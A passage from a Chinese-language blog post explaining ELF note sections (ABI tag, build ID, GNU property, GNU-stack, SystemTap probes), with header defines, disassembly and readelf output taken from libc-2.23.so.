Note节中的Solaris条目有这个名称。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_NOTE_SOLARIS<span class="meta-string">"SUNW Solaris"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Note entries for GNU systems have this name.</span></span><br><span class="line"><span class="comment">// Note节中的GNU Systems有这个名称。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_NOTE_GNU<span class="meta-string">"GNU"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------------------------------------------------------------------------------------- */</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;有时候供应商或者系统构建者可能需要使用一些特殊的信息来标记ELF文件，从而其它程序可以来检查该ELF文件的一致性以及兼容性。SHT_NOTE类型的节(Section)和PT_NOTE类型的程序头(Program Header)元素可用于来实现这个目的。节和程序头元素中的Note信息包含任意数量的表项，每一个表项都是目标处理器格式的4字节的字数组。下面出现的标签有助于解释注释信息的组织形式，但是这并不在ELF文件的规范内。</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_5-1：Note_Information.png" alt="Figure_5-1：Note Information"></center></p><p style="text-align:center;font-weight:bold;margin-top:-20px">Figure 5-1：Note Information</p><ul><li><strong><code>namesz和name</code></strong>: name的前namesz字节包含了一个以Null结尾的字符串，这表示该项的拥有者或者发起人。但是目前并没有避免冲突的格式化的命名机制。一般来说，供应商会使用他们自己公司的名字，例如“XYZ Computer Company”作为标识符。如果没有任何名字的话，namesz应该是0。如有必要，需要进行填充，以使name区域4字节对齐。这样的填充大小不包含在namesz中。</li><li><strong><code>descsz和desc</code></strong>: desc的前descsz字节包含了注释(Note)的描述。ELF文件对于描述的内容没有任何约束。如果没有任何描述的话，descsz应该为0。如有必要，需要进行填充，以使desc区域4字节对齐。这样的填充大小不包含在descsz中。</li><li><strong><code>type</code></strong>: 这个字段给出了描述的解释，每个发起者控制自己的类型。对于同一类型来说，有可能有多个描述与其对应。因此，发起者必须能够识别名称和类型以便于来理解对应的描述。目前来说，类型值必须为非负值，ELF文件的规范里并不定义描述符的意思。这也是为什么type在前面。</li></ul><p>&emsp;&emsp;为了进一步说明，下面给出一个简单的例子。以下注释段(Note Segment)包含两个条目。</p><p><center><img src="/resources/2021/ELF_FileFormat_Analysis/Figure_5-2：Example_Note_Segment.png" alt="Figure 5-2：Example Note Segment"></center></p><p style="text-align:center;font-weight:bold;margin-top:-20px">Figure 5-2：Example Note Segment</p><p>&emsp;&emsp;以上注释段(Note Segment)包含两个注释信息(Note Information)，第一个注释信息的descsz为0，说明不存在desc。第二个注释信息是一个完整的注释信息。</p><blockquote><p>注意：<br>1、系统保留没有name(namesz==0)和name长度为0(name[0]==’\0’)的注释信息(Note Information)，但目前没有定义类型。所有其他names必须至少有一个非空字符。<br>2、注释信息(Note Information)是可选的。注释信息(Note Information)的存在不会影响程序的工具接口标准(Tool Interface Standard,TIS)的一致性，前提是该信息不影响程序的执行行为。否则，程序不符合TIS ELF规范并具有未定义的行为。</p></blockquote><h4 id="5-1-1-note"><a href="#5-1-1-note" class="headerlink" title="5.1.1 .note"></a>5.1.1 .note</h4><p>&emsp;&emsp;此节(Section)存储各种注释信息。此节(Section)的节类型是SHT_NOTE。不使用任何节标志(sh_flags)。[^11]</p><h4 id="5-1-2-note-ABI-tag"><a href="#5-1-2-note-ABI-tag" class="headerlink" title="5.1.2 .note.ABI-tag"></a>5.1.2 .note.ABI-tag</h4><p>&emsp;&emsp;此节(Section)存储运行此ELF文件的目标操作系统的ABI信息。</p><p>&emsp;&emsp;此节(Section)用于声明ELF映像的预期运行时API。它可能包括操作系统名称及其运行时版本。此节(Section)的节类型是SHT_NOTE。唯一使用的节标志(sh_flags)是SHF_ALLOC。[^11]<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Defined note types for GNU systems(为GNU Systems定义注释类型). */</span></span><br><span class="line"><span class="comment">/* ABI information.  The descriptor consists of words:</span></span><br><span class="line"><span class="comment">   word 0: OS descriptor</span></span><br><span class="line"><span class="comment">   word 1: major version of the ABI</span></span><br><span class="line"><span class="comment">   word 2: minor version of the ABI</span></span><br><span class="line"><span class="comment">   word 3: subminor version of the ABI</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_GNU_ABI_TAG1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_NOTE_ABINT_GNU_ABI_TAG  <span class="comment">// Old name.</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Known OSes. These values can appear in word 0 of an NT_GNU_ABI_TAG note section entry.</span></span><br><span class="line"><span class="comment">// 已定义的OS描述符。这些值可以出现在NT_GNU_ABI_TAG注释节条目的desc的第0个字中。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_NOTE_OS_LINUX    0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_NOTE_OS_GNU    1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_NOTE_OS_SOLARIS22</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ELF_NOTE_OS_FREEBSD    3</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;下面是一个.note.ABI-tag节的例子，取自libc6_2.23-0ubuntu11.2_i386的libc-2.23.so：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000198</span> _note_ABI_tag <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="string">'DATA'</span> <span class="meta">use32</span></span><br><span class="line"><span class="number">00000198</span>                 <span class="meta">assume</span> <span class="built_in">cs</span>:_note_ABI_tag</span><br><span class="line"><span class="number">00000198</span>                 <span class="comment">;org 198h</span></span><br><span class="line"><span class="number">00000198</span>                 <span class="built_in">dd</span> <span class="number">4</span>                    <span class="comment">; namesz</span></span><br><span class="line">0000019C                 <span class="built_in">dd</span> <span class="number">10h</span>                  <span class="comment">; descsz</span></span><br><span class="line">000001A0 dword_1A0       <span class="built_in">dd</span> <span class="number">1</span>                    <span class="comment">; DATA XREF: sub_E90A0+16B↓o</span></span><br><span class="line">000001A0                                         <span class="comment">; type, ELF_NOTE_ABI = 0x1</span></span><br><span class="line">000001A4 aGnu_0          <span class="built_in">db</span> <span class="string">'GNU'</span>,<span class="number">0</span>              <span class="comment">; name, ELF_NOTE_GNU = "GNU"</span></span><br><span class="line">000001A8                 <span class="built_in">dd</span> <span class="number">0</span>                    <span class="comment">; OS: Linux</span></span><br><span class="line">000001AC                 <span class="built_in">dd</span> <span class="number">2</span>                    <span class="comment">; ABI Version: 2.6.32</span></span><br><span class="line">000001B0                 <span class="built_in">dd</span> <span class="number">6</span></span><br><span class="line">000001B4                 <span class="built_in">dd</span> <span class="number">32</span></span><br><span class="line">000001B4 _note_ABI_tag ends</span><br></pre></td></tr></table></figure></p><p>你也可以使用readelf对此节(Section)进行查看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -n libc-2.23.so </span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">Displaying notes found at file offset 0x00000198 with length 0x00000020:</span><br><span class="line">  Owner                 Data sizeDescription</span><br><span class="line">  GNU                  0x00000010NT_GNU_ABI_TAG (ABI version tag)</span><br><span class="line">    OS: Linux, ABI: 2.6.32</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;ABI Version: 2.6.32指的是运行编译器的主机上的Glibc构建时使用的内核头文件版本。从广义上讲，它显示了可执行文件能够运行的系统的最小内核版本。如果程序在小于2.6.32的内核上运行，则会显示内核太旧警告。</p><p><code>参考</code>：<a href="https://stackoverflow.com/questions/12236159/linux-command-file-shows-for-gnu-linux-2-6-24" target="_blank" rel="noopener">linux command “file” shows “for GNU/Linux 2.6.24”</a></p><h4 id="5-1-3-note-gnu-build-id"><a href="#5-1-3-note-gnu-build-id" class="headerlink" title="5.1.3 .note.gnu.build-id"></a>5.1.3 .note.gnu.build-id</h4><p>&emsp;&emsp;此节(Section)存储此ELF文件的Build ID信息。Build ID被用来唯一标识一个链接文件。</p><p>&emsp;&emsp;此节(Section)用于保存唯一标识ELF映像内容的ID。具有相同build ID的不同文件应该包含相同的可执行内容。有关更多详细信息，请参阅GNU链接器(ld (1))的–build-id选项。此节(Section)的节类型是SHT_NOTE。唯一使用的节标志(sh_flags)是SHF_ALLOC。[^11]</p><blockquote><p><strong><code>ld --build-id=style</code></strong>: <a href="https://linux.die.net/man/1/ld" target="_blank" rel="noopener">ld</a><br>&emsp;&emsp;请求创建“.note.gnu.build-id”ELF注释节(Section)。注释的内容是标识此链接文件的唯一标识。标识的样式可以是使用128个随机位的“uuid”，对输出内容的标准部分使用160位SHA1散列的“sha1”，对输出内容的标准部分使用128位md5散列的“md5”，或者使用指定为偶数个十六进制数字的选定位串的”0x hexstring”(忽略数字对之间的”-“和”:”字符)。如果省略样式，则使用“sha1”。<br>&emsp;&emsp;“md5”和“sha1”样式产生的标识符在相同的输出文件中总是相同的，但在所有不相同的输出文件中是唯一的。它不打算作为文件内容的校验和进行比较。链接文件稍后可能会被其他工具更改，但标识原始链接文件的Build ID位字符串不会更改。<br>&emsp;&emsp;为style传递“none”会禁用命令行前面任何“–build-id”选项的设置。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Build ID bits as generated by ld --build-id. The descriptor consists of any nonzero number of bytes. */</span></span><br><span class="line"><span class="comment">/* 由ld --build-id生成的Build ID。此描述符包含任何非零的字节数。 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_GNU_BUILD_ID3</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;下面是一个.note.gnu.build-id节的例子，取自libc6_2.23-0ubuntu11.2_i386的libc-2.23.so：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">root@kali:</span>~/Desktop# file libc-<span class="number">2.23</span>.so </span><br><span class="line">libc-<span class="number">2.23</span>.so: ELF <span class="number">32</span>-bit LSB shared object, Intel <span class="number">80386</span>, version <span class="number">1</span> (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so<span class="meta">.2</span>, BuildID[sha1]=bde4e8b0230b1b474cd8a1ca6e9f81bb2b438914, for GNU/Linux <span class="number">2.6</span><span class="meta">.32</span>, stripped</span><br><span class="line"></span><br><span class="line"><span class="number">00000174</span> _note_gnu_build_id <span class="meta">segment</span> <span class="built_in">dword</span> <span class="meta">public</span> <span class="string">'DATA'</span> <span class="meta">use32</span></span><br><span class="line"><span class="number">00000174</span>                 <span class="meta">assume</span> <span class="built_in">cs</span>:_note_gnu_build_id</span><br><span class="line"><span class="number">00000174</span>                 <span class="comment">;org 174h</span></span><br><span class="line"><span class="number">00000174</span> dword_174       <span class="built_in">dd</span> <span class="number">4</span>                    <span class="comment">; DATA XREF: .program.header:off_DC↑o</span></span><br><span class="line"><span class="number">00000174</span>                                         <span class="comment">; namesz</span></span><br><span class="line"><span class="number">00000178</span>                 <span class="built_in">dd</span> <span class="number">14h</span>                  <span class="comment">; descsz</span></span><br><span class="line">0000017C                 <span class="built_in">dd</span> <span class="number">3</span>                    <span class="comment">; DATA XREF: .rodata:0014CAE0↓o</span></span><br><span class="line">0000017C                                         <span class="comment">; type, NT_GNU_BUILD_ID = 0x3</span></span><br><span class="line"><span class="number">00000180</span> aGnu            <span class="built_in">db</span> <span class="string">'GNU'</span>,<span class="number">0</span>              <span class="comment">; name, ELF_NOTE_GNU = "GNU"</span></span><br><span class="line"><span class="number">00000184</span>                                         <span class="comment">; desc, BuildID[sha1]=bde4e8b0230b1b474cd8a1ca6e9f81bb2b438914</span></span><br><span class="line"><span class="number">00000184</span> byte_184        <span class="built_in">db</span> <span class="number">0BDh</span>, <span class="number">0E4h</span>, <span class="number">0E8h</span>, <span class="number">0B0h</span>, <span class="number">23h</span>, <span class="number">0Bh</span>, <span class="number">1Bh</span>, <span class="number">47h</span>, <span class="number">4Ch</span>, <span class="number">0D8h</span></span><br><span class="line"><span class="number">00000184</span>                                         <span class="comment">; DATA XREF: .eh_frame:off_177E90↓o</span></span><br><span class="line"><span class="number">00000184</span>                 <span class="built_in">db</span> <span class="number">0A1h</span>, <span class="number">0CAh</span>, <span class="number">6Eh</span>, <span class="number">9Fh</span>, <span class="number">81h</span>, <span class="number">0BBh</span>, <span class="number">2Bh</span>, <span class="number">43h</span>, <span class="number">89h</span>, <span class="number">14h</span> </span><br><span class="line"><span class="number">00000184</span> _note_gnu_build_id ends</span><br></pre></td></tr></table></figure></p><p>你也可以使用readelf对此节(Section)进行查看：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -n libc-2.23.so </span><br><span class="line"></span><br><span class="line">Displaying notes found at file offset 0x00000174 with length 0x00000024:</span><br><span class="line">  Owner                 Data sizeDescription</span><br><span class="line">  GNU                  0x00000014NT_GNU_BUILD_ID (unique build ID bitstring)</span><br><span class="line">    Build ID: bde4e8b0230b1b474cd8a1ca6e9f81bb2b438914</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure></p><h4 id="5-1-4-note-gnu-property"><a href="#5-1-4-note-gnu-property" class="headerlink" title="5.1.4 .note.gnu.property"></a>5.1.4 .note.gnu.property</h4><p><a href="https://patchwork.kernel.org/project/linux-arm-kernel/patch/1558693533-13465-2-git-send-email-Dave.Martin@arm.com/" target="_blank" rel="noopener">binfmt_elf: Extract .note.gnu.property from an ELF file</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Program property. */</span></span><br><span class="line"><span class="comment">/* 程序属性。 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NT_GNU_PROPERTY_TYPE_0 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Note section name of program property. */</span></span><br><span class="line"><span class="comment">/* 程序属性的注释节名称。 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NOTE_GNU_PROPERTY_SECTION_NAME <span class="meta-string">".note.gnu.property"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------------------------------------------------------------------------------------- */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Values used in GNU .note.gnu.property notes (NT_GNU_PROPERTY_TYPE_0). */</span></span><br><span class="line"><span class="comment">/* 用于GNU的.note.gnu.property注释节的值。 */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Stack size.</span></span><br><span class="line"><span class="comment">// 栈大小。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_STACK_SIZE1</span></span><br><span class="line"><span class="comment">// No copy relocation on protected data symbol.</span></span><br><span class="line"><span class="comment">// 对受保护的数据符号没有拷贝重定位。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_NO_COPY_ON_PROTECTED2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Processor-specific semantics, lo</span></span><br><span class="line"><span class="comment">// 特定于处理器的语义类型值范围的下限。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_LOPROC0xc0000000</span></span><br><span class="line"><span class="comment">// Processor-specific semantics, hi </span></span><br><span class="line"><span class="comment">// 特定于处理器的语义类型值范围的上限。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_HIPROC0xdfffffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Application-specific semantics, lo </span></span><br><span class="line"><span class="comment">// 特定于应用程序的语义类型值范围的下限。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_LOUSER0xe0000000</span></span><br><span class="line"><span class="comment">// Application-specific semantics, hi </span></span><br><span class="line"><span class="comment">// 特定于应用程序的语义类型值范围的上限。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_HIUSER0xffffffff</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The x86 instruction sets indicated by the corresponding bits are used in program. Their support in the hardware is optional. */</span></span><br><span class="line"><span class="comment">/* 程序中使用相应的位表示的x86指令集。它们在硬件上的支持是可选的。 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_USED0xc0000000</span></span><br><span class="line"><span class="comment">/* The x86 instruction sets indicated by the corresponding bits are used in program and they must be supported by the hardware. */</span></span><br><span class="line"><span class="comment">/* 程序中使用相应的位表示的x86指令集，它们必须得到硬件的支持 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_NEEDED0xc0000001</span></span><br><span class="line"><span class="comment">/* X86 processor-specific features used in program. */</span></span><br><span class="line"><span class="comment">/* 在程序中使用的特定的x86处理器特性。*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_FEATURE_1_AND0xc0000002</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This indicates that all executable sections are compatible with IBT. */</span></span><br><span class="line"><span class="comment">/* 这表明所有可执行节都与IBT兼容 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_FEATURE_1_IBT(1U &lt;&lt; 0)</span></span><br><span class="line"><span class="comment">/* This indicates that all executable sections are compatible with SHSTK. */</span></span><br><span class="line"><span class="comment">/* 这表明所有可执行节都与SHSTK兼容。*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_FEATURE_1_SHSTK(1U &lt;&lt; 1)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_486    (1U &lt;&lt; 0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_586    (1U &lt;&lt; 1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_686    (1U &lt;&lt; 2)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_SSE    (1U &lt;&lt; 3)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_SSE2    (1U &lt;&lt; 4)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_SSE3    (1U &lt;&lt; 5)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_SSSE3(1U &lt;&lt; 6)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_SSE4_1(1U &lt;&lt; 7)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_SSE4_2(1U &lt;&lt; 8)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_AVX    (1U &lt;&lt; 9)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_AVX2    (1U &lt;&lt; 10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_AVX512F(1U &lt;&lt; 11)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_AVX512CD(1U &lt;&lt; 12)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_AVX512ER(1U &lt;&lt; 13)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_AVX512PF(1U &lt;&lt; 14)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_AVX512VL(1U &lt;&lt; 15)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_AVX512DQ(1U &lt;&lt; 16)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GNU_PROPERTY_X86_ISA_1_AVX512BW(1U &lt;&lt; 17)</span></span><br><span class="line"><span class="comment">/* ---------------------------------------------------------------------------------------- */</span></span><br></pre></td></tr></table></figure><h4 id="5-1-5-note-GNU-stack"><a href="#5-1-5-note-GNU-stack" class="headerlink" title="5.1.5 .note.GNU-stack"></a>5.1.5 .note.GNU-stack</h4><p>&emsp;&emsp;.note.GNU-stack的内容告诉系统将ELF加载到内存时如何控制堆栈。</p><p>&emsp;&emsp;此节(Section)用于在Linux目标文件(Odject File)中声明堆栈属性。此节(Section)的节类型是SHT_PROGBITS。唯一使用的节标志(sh_flags)是SHF_EXECINSTR。这向GNU链接器表明目标文件(Odject File)需要一个可执行堆栈。[^11]</p><p><code>参考</code>：<br>1、<a href="https://wiki.gentoo.org/wiki/Hardened/GNU_stack_quickstart" target="_blank" rel="noopener">Hardened/GNU stack quickstart</a><br>2、<a href="https://stackoverflow.com/questions/7863200/why-data-and-stack-segments-are-executable" target="_blank" rel="noopener">Why data and stack segments are executable?</a></p><h4 id="5-1-6-note-stapsdt"><a href="#5-1-6-note-stapsdt" class="headerlink" title="5.1.6 .note.stapsdt"></a>5.1.6 .note.stapsdt</h4><p>&emsp;&emsp;LTTng是Linux的开源跟踪框架。</p><p>&emsp;&emsp;使用LTTng的用户空间动态跟踪通过Hook到代码中的预定位置来工作，这些位置可以是ELF函数(ELF functions)或SDT探针(Statically Defined Tracing Probes)。</p><p>&emsp;&emsp;ELF文件的函数列在文件元数据的符号表(Symbol Table)中。您无需执行任何特殊操作即可使这些函数可以用于跟踪(Tracing)。</p><p>&emsp;&emsp;另一方面，SDT探针(SDT probes)由其作者单独插入到应用程序(Apps)和库(Libraries)中，并且需要额外的工具链支持。SDT探针(SDT probes)用于许多Linux发行版上的各种库和应用程序，它们是通过在源代码中使用STAP_PROBE*系列宏的任何位置插入nop指令来实现的。使用nop指令作为占位符允许在附加探针时插入其他可执行指令，但在禁用它们时几乎不会影响性能。</p><p>&emsp;&emsp;无论您是在跟踪ELF函数(ELF functions)还是SDT探针(SDT probes)，实际的探针插入和事件记录都由Linux内核的uprobe接口处理，并且事件记录在内核的缓冲区中。这意味着您需要一个以root身份运行的会话守护程序来加载所需的内核模块并使用此功能。</p><p><strong><code>附加到一个SDT探针</code></strong>：</p><p>&emsp;&emsp;与跟踪库函数不同，开发人员明确插入SDT探针以帮助调试和跟踪，这意味着它们被战略性地(Strategically)放置在代码中您可能需要附加到探针的位置。例如，libc:memory_sbrk_more探针位于libc的malloc()中，当需要分配更多内存来为内存请求提供服务时，会记录sbrk()系统调用的参数。</p><p>&emsp;&emsp;在附加到SDT探针之前，您需要知道您正在使用的应用程序库中有哪些探针可用。您可以通过使用readelf查看ELF注释节(Notes Section)来发现探针列表。例如，这里是readelf显示的libc.so.6库的ELF注释节(Notes Section)的一部分。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -n /lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line"> [...]</span><br><span class="line"> Displaying notes found in: .note.stapsdt</span><br><span class="line">   Owner                 Data sizeDescription</span><br><span class="line">   stapsdt              0x0000003aNT_STAPSDT (SystemTap probe descriptors)</span><br><span class="line">     Provider: libc</span><br><span class="line">     Name: setjmp</span><br><span class="line">     Location: 0x000000000003ebb1, Base: 0x00000000001bdd48, Semaphore: 0x0000000000000000</span><br><span class="line">     Arguments: 8@%rdi -4@%esi 8@%rax</span><br><span class="line"> [...]</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;您感兴趣的是stapsdt拥有的带有NT_STAPSDT描述的注释部分。这些注释部分显示了库或应用程序中的所有探针，以及每个条目中最重要的部分，Provider和Name - 附加到探针时您将需要这两个部分。</p><p><code>参考</code>：<a href="https://lttng.org/blog/2019/10/15/new-dynamic-user-space-tracing-in-lttng/" target="_blank" rel="noopener">The new dynamic user space tracing feature in LTTng</a></p><h4 id="5-1-7-stapsdt-base"><a href="#5-1-7-stapsdt-base" class="headerlink" title="5.1.7 .stapsdt.base"></a>5.1.7 .stapsdt.base</h4><p>&emsp;&emsp;SystemTap是一个Linux非常有用的调试(跟踪/探测)工具，常用于Linux内核或者应用程序的信息采集，比如：获取一个函数里面运行时的变量、调用堆栈，甚至可以直接修改变量的值，对诊断性能或功能问题非常有帮助。SystemTap提供非常简单的命令行接口和很简洁的脚本语言，以及非常丰富的tapset和例子。</p><p>&emsp;&emsp;Systemtap使用编译器宏来注册它的SDT探针，因此不可能在运行时注册探针。下面显示了一个示例，我们将一个名为Probe的探针注册到一个名为Provider的提供者。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sdt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DTRACE_PROBE(Provider, Probe);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;此代码生成的二进制文件将有一个名为.stapsdt.base的新的ELF节(Section)，位于代码之后(通常是.text节)。此基址(Base)与帮助跟踪工具在二进制文件加载到内存后计算任何探针的内存地址相关。</p><p>&emsp;&emsp;它还将有一个ELF注释节(Notes Section)，其中将存储所有探针数据[名称(name)、地址(address)、信号量(semaphores)、参数(arguments)]以供任何跟踪工具稍后读取。编译器还将用函数调用替换我们的DTRACE_PROBE宏，这就是探针指向的地方，从而可以轻松地将参数传递给探针。此函数是空操作(no-op)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Displaying notes found at file offset 0x00001064 with length 0x0000003c:</span><br><span class="line">  Owner                 Data size       Description</span><br><span 